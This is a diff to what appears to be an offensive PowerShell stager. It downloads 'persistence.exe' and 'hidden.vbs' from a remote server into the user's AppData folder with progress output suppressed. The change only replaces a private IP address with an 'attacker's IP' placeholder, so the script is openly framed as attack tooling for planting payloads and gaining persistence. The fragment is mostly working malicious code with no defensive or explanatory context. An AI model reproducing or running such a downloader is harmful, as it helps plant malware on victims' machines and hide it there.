@@ -4,7 +4,7 @@ $ProgressPreference = "SilentlyContinue"
 # Download persistence.exe
 try {
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile("http://192.168.0.109/persistence.exe", "$($env:APPDATA)\persistence.exe")
+    $webClient.DownloadFile("http://<attacker's IP>/persistence.exe", "$($env:APPDATA)\persistence.exe")
     $webClient.Dispose()
 }
 catch {
@@ -15,7 +15,7 @@ catch {
 # Download hidden.vbs (only executes if persistence.exe download succeeded)
 try {
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile("http://192.168.0.109/hidden.vbs", "$($env:APPDATA)\hidden.vbs")
+    $webClient.DownloadFile("http://<attacker's IP>/hidden.vbs", "$($env:APPDATA)\hidden.vbs")
     $webClient.Dispose()
 }
 catch {
